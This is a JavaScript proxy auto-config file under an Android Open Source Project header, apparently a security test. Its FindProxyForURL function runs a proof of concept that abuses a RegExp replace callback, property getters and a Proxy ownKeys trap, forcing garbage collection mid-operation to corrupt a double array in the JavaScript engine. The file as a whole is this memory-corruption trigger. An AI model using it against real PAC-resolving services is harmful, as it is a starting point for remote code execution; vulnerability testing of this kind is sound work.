/*
 * Copyright (C) 2021 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

function gc() {
    for (let i = 0; i < 0x10; i++)
        new ArrayBuffer(0x800000);
}
function to_dict(obj) {
obj.__defineGetter__('x',()=>2);
obj.__defineGetter__('x',()=>2);
}
function fk() {
rgx = null;
dbl_arr = [1.1, 2.2, 3.3, 4.4];
o = {};
o.__defineGetter__("length", ()=> {
            rgx = new RegExp(/AAAAAAAA/y);
            return 2;
        });
o[0] = "aaaa";
o.__defineGetter__(1, ()=> {
            for (let i=0;i<8;i++) dbl_arr.push(5.5);

            let cnt = 0;
            rgx[Symbol.replace]("AAAAAAAA", {
                        toString: ()=> {
                            cnt++;
                            if (cnt == 2) {
                                rgx.lastIndex = {valueOf: ()=> {
                                        to_dict(rgx);
                                        gc();
                                        return 0;
                                    }};

                            }

                            return 'BBBB$';
                        }
                    });
            return "bbbb";
        });
p = new Proxy( {}, {
            ownKeys: function(target) {
                return o;
            },
            getOwnPropertyDescriptor(target, prop) {
                return {configurable: true, enumerable: true, value: 5};
            }
        });

Object.keys(p);
alert (dbl_arr[0]);
if (dbl_arr[0] == 1.1) {
    fail("failed to corrupt dbl_arr");
}
}

function FindProxyForURL(url, host) {
fk();
return "DIRECT";
}
